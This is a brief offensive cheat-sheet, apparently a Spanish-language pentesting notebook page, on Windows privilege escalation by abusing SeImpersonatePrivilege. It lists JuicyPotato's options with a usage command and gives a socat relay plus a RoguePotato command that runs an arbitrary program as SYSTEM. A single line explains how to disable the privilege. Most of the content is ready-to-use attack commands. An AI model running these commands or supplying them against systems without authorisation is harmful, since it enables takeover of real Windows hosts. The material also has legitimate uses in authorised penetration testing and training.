# SeImpersonatePrivilege

### JuicePotato

```
Mandatory args: 
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args: 
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user
```

#### Uso:&#x20;

```powershell
.\JuicyPotato.exe -t * -p <filetorun> -l 1338
```

#### Desctivar

Windows Settings -> Security Settings -> Local Policies **(Secpol.msc)** -> User Rights Assignment and check the "Impersonate a client after authentication"

{% embed url="https://github.com/ohpe/juicy-potato/" %}

{% embed url="https://github.com/antonioCoco/RoguePotato" %}

Depende de la versión de windows, JuiciPotato ya esta parchado. Sin embargo después salio un nuevo exploit.

### RoguePotato

```csharp
socat tcp-listen:135,reuseaddr,fork tcp:<vitima>:9999
RoguePotato.exe -r 172.16.226.131 -e "comando" -l 9999
```
